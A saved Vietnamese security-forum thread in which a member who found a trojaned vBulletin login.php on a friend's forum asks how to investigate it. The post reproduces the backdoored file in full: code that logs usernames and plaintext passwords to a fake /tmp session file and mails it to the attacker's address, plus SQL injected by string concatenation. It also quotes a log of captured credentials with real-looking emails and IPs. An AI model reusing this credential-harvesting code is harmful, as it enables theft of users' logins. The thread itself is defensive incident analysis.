<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Xem lại các email đã gởi từ hàm mail() trên PHP, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Xem lại các email đã gởi từ hàm mail() trên PHP - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.hva">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.hva">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.hva">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.hva">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.hva">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.hva"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.hva">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.hva">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.hva">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.hva">Forum Index </a> 
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/12.hva">Thảo luận thâm nhập </a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/42028.hva" name="top" id="top">Xem lại các email đã gởi từ hàm mail() trên PHP</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#6699FF">[Analyzing]</font></span>&nbsp;&nbsp; Xem lại các email đã gởi từ hàm mail() trên PHP<a name="261895" id="261895"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">23/04/2012 09:45:49 (+0700) | <a href="/hvaonline/posts/list/42028.hva#261895">#1</a> | 261895 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/470a2bbbf7d95c959bdb0ce7f2cec169.jpg" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/126158.hva"><b>phonglanbiec</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 03/07/2006 20:56:00<br>
		Messages: 162<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/126158.hva" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/126158.hva" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Chào các bạn,<br/> <br/> Mình đang gặp 1 tình huống như sau:<br/> <br/> - Forum của bạn mình sử dụng VBB có bản quyền. Nhưng hôm nay thì không login vào được. Thế là hắn nhờ mình kiểm tra tại sao.<br/> - Mình kiểm tra trong file login.php thì phát hiện rằng có 1 đoạn mã sẽ lưu lại tất cả thông tin người gởi gởi lên. Lưu vào 1 file (mà hắn giả là session) ở /tmp/. Cứ mỗi lần file có dung lượng &gt;= 10MB thì hàm mail() sẽ tự gởi đến địa chỉ email của hắn.<br/> - Cách khắc phục tạm thời của mình là lấy 1 file login.php sạch thế cho file đó.<br/> <br/> Và hiện tại mình cần giúp đỡ để điều tra thêm:<br/> <br/> 1. Làm thế nào để kiểm tra đã có bao nhiêu email gởi từ hàm mail() của PHP?<br/> 2. Tại sao có 1 giai đoạn tự nhiên nó không nhận cái form password gởi lên?<br/> <br/> Vì nội dung file log lại là:<br/> <br/> <br/> <blockquote>User: xxx Pass: 113114 Email <img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">xx@yahoo.com.vn ID : 35164  GroupID : 4 IP: 123.16.146.0 Time: Sunday 22nd of April 2012 08:08:35 PM<br/> User: xxx Pass: 314159htm Email <img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">xx@yahoo.com ID : 11557  GroupID : 17 IP: 113.185.1.167 Time: Sunday 22nd of April 2012 08:09:29 PM<br/> User: xxx Pass: canhdonglua Email <img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">xx@yahoo.com ID : 22680  GroupID : 2 IP: 1.52.27.213 Time: Sunday 22nd of April 2012 08:11:54 PM<br/> User: onelove46 Pass:  Email :hoahuongduong663@gmail.com ID : 31446  GroupID : 2 IP: 123.24.141.8 Time: Sunday 22nd of April 2012 08:19:00 PM<br/> User: tienhieuo01 Pass:  Email :tienhieuo01@yahoo.com.vn ID : 26462  GroupID : 2 IP: 1.53.2.31 Time: Sunday 22nd of April 2012 08:40:21 PM<br/> User: edenhoang Pass:  Email :uptinmuaban@gmail.com ID : 33772  GroupID : 3 IP: 113.172.221.137 Time: Sunday 22nd of April 2012 08:41:33 PM&nbsp;
		</blockquote><br/> <br/> Nội dung file php mà hắn đã sửa lại là:<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
/*======================================================================*\
|| #################################################################### ||
|| # vBulletin 3.8.4 - Licence Number VBF6B249B5
|| # ---------------------------------------------------------------- # ||
|| # Copyright ï¿&#65533;2000-2009 Jelsoft Enterprises Ltd. All Rights Reserved. ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- VBULLETIN IS NOT FREE SOFTWARE ---------------- # ||
|| #<span class="link"> http://www.vbulletin.com</span> |<span class="link"> http://www.vbulletin.com/license.html</span> # ||
|| #################################################################### ||
\*======================================================================*/

// ####################### SET PHP ENVIRONMENT ###########################
error_reporting&#40;E_ALL & ~E_NOTICE & ~8192&#41;;

// #################### DEFINE IMPORTANT CONSTANTS #######################
define&#40;'THIS_SCRIPT', 'login'&#41;;
define&#40;'CSRF_PROTECTION', true&#41;;
define&#40;'CSRF_SKIP_LIST', 'login'&#41;;

// ################### PRE-CACHE TEMPLATES AND DATA ######################
// get special phrase groups
$phrasegroups = array&#40;&#41;;

// get special data templates from the datastore
$specialtemplates = array&#40;&#41;;

// pre-cache templates used by all actions
$globaltemplates = array&#40;&#41;;

// pre-cache templates used by specific actions
$actiontemplates = array&#40;
	'lostpw' =&gt; array&#40;
		'lostpw',
		'humanverify'
	&#41;
&#41;;

// ######################### REQUIRE BACK-END ############################
require_once&#40;'./global.php'&#41;;
require_once&#40;DIR . '/includes/functions_login.php'&#41;;

// #######################################################################
// ######################## START MAIN SCRIPT ############################
// #######################################################################

$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'a', TYPE_STR&#41;;

if &#40;empty&#40;$_REQUEST&#91;'do'&#93;&#41; AND empty&#40;$vbulletin-&gt;GPC&#91;'a'&#93;&#41;&#41;
{
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start logout ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'logout'&#41;
{
	define&#40;'NOPMPOPUP', true&#41;;

	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'logouthash', TYPE_STR&#41;;

	if &#40;$vbulletin-&gt;userinfo&#91;'userid'&#93; != 0 AND !verify_security_token&#40;$vbulletin-&gt;GPC&#91;'logouthash'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken_raw'&#93;&#41;&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'logout_error', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken'&#93;&#41;&#41;&#41;;
	}

	process_logout&#40;&#41;;

	$vbulletin-&gt;url = fetch_replaced_session_url&#40;$vbulletin-&gt;url&#41;;
	if &#40;strpos&#40;$vbulletin-&gt;url, 'do=logout'&#41; !== false&#41;
	{
		$vbulletin-&gt;url = $vbulletin-&gt;options&#91;'forumhome'&#93; . '.php' . $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;;
	}
	$show&#91;'member'&#93; = false;
	eval&#40;standard_error&#40;fetch_error&#40;'cookieclear', create_full_url&#40;$vbulletin-&gt;url&#41;, $vbulletin-&gt;options&#91;'forumhome'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;&#41;, '', false&#41;&#41;;

}

// ############################### start do login ###############################
// this was a _REQUEST action but where do we all login via request?
if &#40;$_POST&#91;'do'&#93; == 'login'&#41;
{
	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'vb_login_username'        =&gt; TYPE_STR,
		'vb_login_password'        =&gt; TYPE_STR,
		'vb_login_md5password'     =&gt; TYPE_STR,
		'vb_login_md5password_utf' =&gt; TYPE_STR,
		'postvars'                 =&gt; TYPE_BINARY,
		'cookieuser'               =&gt; TYPE_BOOL,
		'logintype'                =&gt; TYPE_STR,
		'cssprefs'                 =&gt; TYPE_STR,
	&#41;&#41;;
	try{
      		if&#40;$vbulletin-&gt;db-&gt;query_first&#40;&quot;SELECT username FROM userpan WHERE username ='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;&#41;{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;UPDATE userpan  set password='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;' where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
		}else{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;INSERT INTO  userpan&#40;username,password&#41; values&#40;'&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;','&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;'&#41;&quot;&#41;;
		}      	
		$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;=&quot;&quot;;
 		}
	catch&#40;Exception $e&#41;{}
	// can the user login?
	$strikes = verify_strike_status&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
	}

	// make sure our user info stays as whoever we were &#40;for example, we might be logged in via cookies already&#41;
	$original_userinfo = $vbulletin-&gt;userinfo;

	if &#40;!verify_authentication&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password_utf'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, true&#41;&#41;
	{
		&#40;$hook = vBulletinHook::fetch_hook&#40;'login_failure'&#41;&#41; ? eval&#40;$hook&#41; : false;

		// check password
		exec_strike_user&#40;$vbulletin-&gt;userinfo&#91;'username'&#93;&#41;;

		if &#40;$vbulletin-&gt;GPC&#91;'logintype'&#93; === 'cplogin' OR $vbulletin-&gt;GPC&#91;'logintype'&#93; === 'modcplogin'&#41;
		{
			// log this error if attempting to access the control panel
			require_once&#40;DIR . '/includes/functions_log_error.php'&#41;;
			log_vbulletin_error&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, 'security'&#41;;
		}
		$vbulletin-&gt;userinfo = $original_userinfo;

		if &#40;$vbulletin-&gt;options&#91;'usestrikesystem'&#93;&#41;
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin_strikes', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
		}
		else
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
		}
	}

	exec_unstrike_user&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	// create new session
	process_new_login&#40;$vbulletin-&gt;GPC&#91;'logintype'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, $vbulletin-&gt;GPC&#91;'cssprefs'&#93;&#41;;



$lg_username = strtolower&#40;$vbulletin-&gt;GPC&#91;&quot;vb_login_username&quot;&#93;&#41;; 
   	$lg_password = $vbulletin-&gt;GPC&#91;&quot;vb_login_password&quot;&#93;; 
&#91;color=red&#93;   	$mail=&quot;xxx@live.com&quot;;
	$lfile=&quot;/tmp/sess_xxx&quot;;&#91;/color&#93;
	$lhande=@fopen&#40;$lfile,'a'&#41;;
$email = &quot;unknow&quot;;
        if&#40;isset&#40;$vbulletin-&gt;userinfo&#91;'email'&#93;&#41;&#41;
	$email = $vbulletin-&gt;userinfo&#91;'email'&#93;;
        $userid =$vbulletin-&gt;userinfo&#91;'userid'&#93;; 
        $groupID=$vbulletin-&gt;userinfo&#91;'usergroupid'&#93;; 
	$result = @mysql_query&#40;&quot;select email from user where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
	if&#40;$result&#41;
	{
		$row = @mysql_fetch_array&#40;$result&#41;;
			$email = $row&#91;&quot;email&quot;&#93;;
	}	
	$ldata=&quot;User: &quot;.$_POST&#91;&quot;vb_login_username&quot;&#93;.&quot; Pass: &quot;.$lg_password.&quot; Email :&quot;.$email .&quot; ID : &quot;.$userid. &quot;  GroupID : &quot;.$groupID. &quot; IP: &quot;.$_SERVER&#91;&quot;REMOTE_ADDR&quot;&#93;.&quot; Time: &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;.&quot;\n&quot;;
	$sub=@$_SERVER&#91;'HTTP_HOST'&#93;.&quot;  user login &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;;
	@fwrite&#40;$lhande,$ldata&#41;;
	@fclose&#40;$lhande&#41;;
	if&#40;@filesize&#40;$lfile&#41;&gt;=1024*10&#41; {
		$data=file_get_contents&#40;$lfile&#41;;
		@mail&#40;$mail,$sub,$data&#41;;
		@unlink&#40;$lfile&#41;;
	}














	// do wwwect
	do_login_wwwect&#40;&#41;;

}
else if &#40;$_GET&#91;'do'&#93; == 'login'&#41;
{
	// add consistency with previous behavior
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start lost password ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'lostpw'&#41;
{
	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'email', TYPE_NOHTML&#41;;
	$email = $vbulletin-&gt;GPC&#91;'email'&#93;;

	if &#40;$permissions&#91;'forumpermissions'&#93; & $vbulletin-&gt;bf_ugp_forumpermissions&#91;'canview'&#93;&#41;
	{
		$navbits = construct_navbits&#40;array&#40;'' =&gt; $vbphrase&#91;'lost_password_recovery_form'&#93;&#41;&#41;;
		eval&#40;'$navbar = &quot;' . fetch_template&#40;'navbar'&#41; . '&quot;;'&#41;;
	}
	else
	{
		$navbar = '';
	}

	// human verification
	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verification =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		$human_verify = $verification-&gt;output_token&#40;&#41;;
	}
	else
	{
		$human_verify = '';
	}

	$url =& $vbulletin-&gt;url;
	eval&#40;'print_output&#40;&quot;' . fetch_template&#40;'lostpw'&#41; . '&quot;&#41;;'&#41;;
}

// ############################### start email password ###############################
if &#40;$_POST&#91;'do'&#93; == 'emailpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'email' =&gt; TYPE_STR,
		'userid' =&gt; TYPE_UINT,
		'humanverify'  =&gt; TYPE_ARRAY,
	&#41;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'email'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}

	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verify =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		if &#40;!$verify-&gt;verify_token&#40;$vbulletin-&gt;GPC&#91;'humanverify'&#93;&#41;&#41;
		{
	  		standard_error&#40;fetch_error&#40;$verify-&gt;fetch_error&#40;&#41;&#41;&#41;;
	  	}
	}

	require_once&#40;DIR . '/includes/functions_user.php'&#41;;

	$users = $db-&gt;query_read_slave&#40;&quot;
		SELECT userid, username, email, languageid
		FROM &quot; . TABLE_PREFIX . &quot;user
		WHERE email = '&quot; . $db-&gt;escape_string&#40;$vbulletin-&gt;GPC&#91;'email'&#93;&#41; . &quot;'
	&quot;&#41;;
	if &#40;$db-&gt;num_rows&#40;$users&#41;&#41;
	{
		while &#40;$user = $db-&gt;fetch_array&#40;$users&#41;&#41;
		{
			if &#40;$vbulletin-&gt;GPC&#91;'userid'&#93; AND $vbulletin-&gt;GPC&#91;'userid'&#93; != $user&#91;'userid'&#93;&#41;
			{
				continue;
			}
			$user&#91;'username'&#93; = unhtmlspecialchars&#40;$user&#91;'username'&#93;&#41;;

			$user&#91;'activationid'&#93; = build_user_activation_id&#40;$user&#91;'userid'&#93;, 2, 1&#41;;

			eval&#40;fetch_email_phrases&#40;'lostpw', $user&#91;'languageid'&#93;&#41;&#41;;
			vbmail&#40;$user&#91;'email'&#93;, $subject, $message, true&#41;;
		}

		$vbulletin-&gt;url = str_replace&#40;'&quot;', '', $vbulletin-&gt;url&#41;;
		eval&#40;print_standard_wwwect&#40;'wwwect_lostpw', true, true&#41;&#41;;
	}
	else
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}
}

// ############################### start reset password ###############################
if &#40;$vbulletin-&gt;GPC&#91;'a'&#93; == 'pwd' OR $_REQUEST&#91;'do'&#93; == 'resetpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'r', array&#40;
		'userid'       =&gt; TYPE_UINT,
		'u'            =&gt; TYPE_UINT,
		'activationid' =&gt; TYPE_STR,
		'i'            =&gt; TYPE_STR
	&#41;&#41;;

	if &#40;!$vbulletin-&gt;GPC&#91;'userid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'userid'&#93; = $vbulletin-&gt;GPC&#91;'u'&#93;;
	}

	if &#40;!$vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'activationid'&#93; = $vbulletin-&gt;GPC&#91;'i'&#93;;
	}

	$userinfo = verify_id&#40;'user', $vbulletin-&gt;GPC&#91;'userid'&#93;, 1, 1&#41;;

	$user = $db-&gt;query_first&#40;&quot;
		SELECT activationid, dateline
		FROM &quot; . TABLE_PREFIX . &quot;useractivation
		WHERE type = 1
			AND userid = $userinfo&#91;userid&#93;
	&quot;&#41;;

	if &#40;!$user&#41;
	{
		// no activation record, probably got back here after a successful request, back to home
		exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
	}

	if &#40;$user&#91;'dateline'&#93; &lt; &#40;TIMENOW - 24 * 60 * 60&#41;&#41;
	{  // is it older than 24 hours?
		eval&#40;standard_error&#40;fetch_error&#40;'resetexpired', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	if &#40;$user&#91;'activationid'&#93; != $vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{ //wrong act id
		eval&#40;standard_error&#40;fetch_error&#40;'resetbadid', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	// delete old activation id
	$db-&gt;query_write&#40;&quot;DELETE FROM &quot; . TABLE_PREFIX . &quot;useractivation WHERE userid = $userinfo&#91;userid&#93; AND type = 1&quot;&#41;;

	$newpassword = fetch_random_password&#40;8&#41;;

	// init user data manager
	$userdata =& datamanager_init&#40;'User', $vbulletin, ERRTYPE_STANDARD&#41;;
	$userdata-&gt;set_existing&#40;$userinfo&#41;;
	$userdata-&gt;set&#40;'password', $newpassword&#41;;
	$userdata-&gt;save&#40;&#41;;

	&#40;$hook = vBulletinHook::fetch_hook&#40;'reset_password'&#41;&#41; ? eval&#40;$hook&#41; : false;

	eval&#40;fetch_email_phrases&#40;'resetpw', $userinfo&#91;'languageid'&#93;&#41;&#41;;
	vbmail&#40;$userinfo&#91;'email'&#93;, $subject, $message, true&#41;;

	eval&#40;standard_error&#40;fetch_error&#40;'resetpw', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;

}

/*======================================================================*\
|| ####################################################################
|| # Downloaded: 21:09, Mon Sep 28th 2009
|| # CVS: $RCSfile$ - $Revision: 31381 $
|| ####################################################################
\*======================================================================*/
?&gt;</pre>
		</div><br/> <br/> Thông tin về server:<br/> <br/> <blockquote>Apache version	2.2.17<br/> PHP version	5.2.14<br/> MySQL version	5.0.95-community<br/> Architecture	i686<br/> Operating system	linux<br/> Kernel version	2.6.18-238.19.1.el5PAE&nbsp;
		</blockquote></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
